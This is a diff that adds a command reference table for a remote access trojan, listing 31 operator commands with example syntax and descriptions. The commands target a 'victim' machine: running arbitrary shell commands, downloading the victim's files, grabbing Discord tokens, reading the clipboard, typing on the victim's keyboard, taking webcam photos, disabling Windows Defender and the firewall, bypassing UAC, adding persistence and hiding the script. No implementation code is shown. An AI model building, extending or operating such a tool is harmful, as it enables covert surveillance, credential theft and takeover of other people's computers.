@@ -1,0 +1,31 @@
+!shell	!shell whoami	Execute any system command
+!screenshot	!screenshot	Capture screen
+!currentdir	!currentdir	Show current directory
+!cd	!cd C:\Windows	Change directory
+!dir	!dir	List files in current dir
+!download	!download C:\file.txt	Download file from victim
+!delete	!delete C:\file.txt	Delete file
+!message	!message Hello	Popup message box
+!write	!write Hello	Type text on victim keyboard
+!clipboard	!clipboard	Get clipboard content
+!admincheck	!admincheck	Check admin privileges
+!listprocess	!listprocess	List all running processes
+!prockill	!prockill notepad.exe	Kill process by name
+!shutdown	!shutdown	Shutdown PC
+!restart	!restart	Restart PC
+!logoff	!logoff	Log off current user
+!bluescreen	!bluescreen	Blue Screen of Death
+!datetime	!datetime	Show date and time
+!geolocate	!geolocate	IP geolocation map
+!startup	!startup	Add to Windows startup
+!hide	!hide	Hide script file
+!wallpaper	!wallpaper C:\img.jpg	Change desktop wallpaper
+!disabledefender	!disabledefender	Disable Windows Defender
+!disablefirewall	!disablefirewall	Disable Windows Firewall
+!grabtokens	!grabtokens	Grab Discord tokens
+!getcams	!getcams	List available webcams
+!webcampic	!webcampic	Take webcam photo
+!critproc	!critproc	Make process critical (BSOD if killed)
+!uncritproc	!uncritproc	Remove critical status
+!uacbypass	!uacbypass	Attempt UAC bypass
+!exit	!exit	Stop the RAT
